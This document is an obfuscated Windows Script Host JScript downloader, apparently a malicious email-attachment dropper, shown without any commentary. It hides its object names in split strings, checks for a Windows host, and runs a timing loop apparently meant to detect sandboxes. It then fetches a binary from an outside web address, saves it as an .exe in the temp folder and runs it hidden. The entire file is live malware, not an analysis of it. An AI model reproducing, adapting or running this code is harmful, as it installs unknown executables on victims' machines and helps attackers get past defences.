var C0 = false;
var FV = "Create"+"Object";
var HK = function GF() {return WScript[FV]("WScript"+".Shell");}(), D1 = 11;
var C = "MSXML2"+".XMLHTTP";
var L = 2;
var UL = L - 2;
function KF(F){HK["Run"](F, UL, UL);};
function U(){return C + "";};
function B(Z0, YK){UL = UL * 1; return Z0 - YK;};
function K(){return FV;};
/*@cc_on
  @if (@_win32 || @_win64)
    C0 = true;
  @end
@*/
if (C0)
{
var VD = "";
function LX(){return 22;};
var O = 0; var MV = 0;
function MY()
{
var XK = new this["Date"]();
var NF = XK["getUTCMilliseconds"]();
WScript["Sleep"](LX());
var XK = new this["Date"]();
var P = XK["getUTCMilliseconds"]();
WScript["Sleep"](LX());
var XK = new this["Date"]();
var H = XK["getUTCMilliseconds"]();
var O = "FQ";
O = B(P, NF);
var MV = "X0";
MV = B(H, P);
VD = "open";
return B(O, MV);
}
var MH = false;
var Z = false;
for (var D0 = UL; D0 < LX() * 1; D0++){if (MY() != UL){
MH = true; 
MV = "31" + 11 * O + MV; 
Z = true; 
break;
}}
function LO() {return ((MH == true) && (MH == Z)) ? 1 : UL;};
if (MH && LO() && Z){
function MF() {return HK["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "UFnkziktxEt.ex" + "e";};
 ZO = U();
 MT = WScript[FV](ZO);
 var YE = 1;
do { 
	for (;YE;){
	try {
		if (YE == 1)
		{
			MT[VD]("GET", "http://aaacollectionsjewelry.com/x9djsa", false);
			MT["send"]();
			U0 = "Sleep";
			YE = 2;
		}
		WScript[U0](LX() + 120); 
		if (MT["readystate"] < 2 * 2) continue;
		YE = UL;
		function D(GO) {var W = (1, 2, 3, 4, 5, GO); return W;};
		U1 = WScript[K()]("ADODB.Stream");
		ZO = U1;
		ZO[VD]();
		ZO["type"] = D(1);
		ZO["write"](MT["ResponseBody"]);
		U1["position"] = D(UL);
		ZO["Save" + "ToFile"](MF(), 2);
		U1["cl"+"ose"]();
		X = MF();
		KF(X);
	} catch(E){};};
}while (YE);
}
}

